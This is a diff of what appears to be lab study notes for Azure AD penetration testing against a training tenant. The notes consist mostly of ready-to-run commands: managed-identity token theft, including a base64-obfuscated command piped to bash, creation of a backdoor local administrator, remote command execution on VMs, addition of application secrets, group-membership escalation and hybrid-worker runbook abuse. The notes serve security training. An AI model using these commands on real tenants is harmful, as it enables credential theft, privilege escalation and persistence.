@@ -17,6 +17,7 @@ Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
 C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o C:\AzAD\Tools\validemails.txt
 # Enumerate Subdomains
 . C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1
+# You can add hr, career, etc to Misc\permutations.txt
 Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
 ```
 
@@ -60,7 +61,6 @@ Get-MgRoleManagementDirectoryRoleDefinition | ?{$_.IsBuiltIn -eq $False} | selec
 
 #### Login
 
-```powershell
 ```powershell
 $passwd = ConvertTo-SecureString "password" -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
@@ -170,13 +170,18 @@ Could be these vulnerabilities:
 2. SSTI
 3. RCE
 
-```powershell
-env
-# Get Token
-curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
+```bash
+# For Linux
+echo 'Y3VybCAiJElERU5USVRZX0VORFBPSU5UP3Jlc291cmNlPWh0dHBzOi8vZ3JhcGgubWljcm9zb2Z0LmNvbS8mYXBpLXZlcnNpb249MjAxNy0wOS0wMSIgLUggc2VjcmV0OiRJREVOVElUWV9IRUFERVI=' | base64 -d | bash
 ```
 
-With the token you can enumerate the permissions but by default Azure not show that 
+#### Management Azure
+
+```powershell
+env
+# Get Token Azure
+curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
+```
 
 ```powershell
 $Token =  'eyJ0eX..'
@@ -189,11 +194,144 @@ $RequestParams = @{
         'Authorization' = "Bearer $Token" 
     }
 }
-(Invoke-RestMethod @RequestParams).value 
+(Invoke-RestMethod @RequestParams).value
+# Change URI to /resources after obtain subscription
+# Example: https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01
+# After /providers/Microsoft.Authorization/permissions 
+# Example: https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01
 ```
 
-```powershell
+### VM
 
+#### Add user code
+
+```powershell
+$passwd = ConvertTo-SecureString "passs" -AsPlainText -Force
+New-LocalUser -Name studentX -Password $passwd 
+Add-LocalGroupMember -Group Administrators -Member studentx
+```
+
+#### Run Command
+
+```powershell
+Invoke-AzVMRunCommand `
+    -ResourceGroupName "Engineering" `
+    -VMName "bkpadconnect" `
+    -CommandId "RunPowerShellScript" `
+    -ScriptString "whoami"
+# or script
+Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose
+```
+
+#### Extract IP
+
+```powershell
+Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering | select -ExpandProperty NetworkProfile #Networkinterface
+Get-AzNetworkInterface -Name bkpadconnect368 #IPCONFIGURSATION
+Get-AzPublicIpAddress -Name bkpadconnectIP
+```
+
+#### Connnect Session
+
+```powershell
+$password = ConvertTo-SecureString 'pass' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('user', $Password)
+$sess = New-PSSession -ComputerName <ip> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
+Enter-PSSession $sess
+```
+
+#### Graph
+
+```powershell
+env
+# Get Token Graph
+curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
+```
+
+List enterprise Applications
+
+```powershell
+$Token =  'eyJ0eX..'
+$URI = ' https://graph.microsoft.com/v1.0/applications'
+
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{
+        'Authorization' = "Bearer $Token" 
+    }
+}
+(Invoke-RestMethod @RequestParams).value
+```
+
+##### Abuse Enterprise Applications
+
+```powershell
+. C:\AzAD\Tools\Add-AzADAppSecret.ps1
+Add-AzADAppSecret -GraphToken $token -Verbose
+```
+
+### Storage
+
+```powershell
+# Recon
+. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1
+# List possible blobs. Example: https://defcorpcommon.blob.core.windows.net/backup?restype=container&comp=list
+```
+
+### SAS
+
+> If you have a SAS URL you can use `Microsoft Azure Storage Explorer`
+
+```
+https://<storage_account>.blob.core.windows.net/<container_name>/<blob_name>?sv=2024-01-01&se=2024-12-31T23%3A59%3A59Z&sr=b&sp=rwdlacup&sig=abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
+```
+
+With the token you can enumerate the permissions but by default Azure not show that 
+
+
+## Automation Accounts
+
+### Using token
+
+```powershell
+az ad signed-in-user show 
+az extension add --upgrade -n automation
+az ad signed-in-user list-owned-objects 
+# "displayName": "Automation Admins"
+# Get token
+az account get-access-token --resource-type ms-graph
+$token = 'ey..'
+Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
+```
+
+Add user with the object id to the group to the groupo ID 
+
+```powershell
+$params = @{
+     "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/<object id>"
+}
+New-MgGroupMemberByRef -GroupId <object ID> -BodyParameter $params
+# or
+New-MgGroupMember -GroupId <group object id> -DirectoryObjectId <user object id>
+```
+
+### Exploiting
+
+Using the user with the permissions "Automation Admins"
+
+```bash
+az account get-access-token
+az account get-access-token --resource-type aad-graph
+$AADToken = 'eyJ0…'
+$AccessToken = 'eyJ0…'
+Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId <user object ID>
+# Check permissions. Also you can check with bloodhound CE
+Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation
+Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
+Import-AzAutomationRunbook -Name student99 -Path C:\AzAD\Tools\student99.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
+Publish-AzAutomationRunbook -RunbookName student99 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
+Start-AzAutomationRunbook -RunbookName student99 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
 ```
 
 ## References
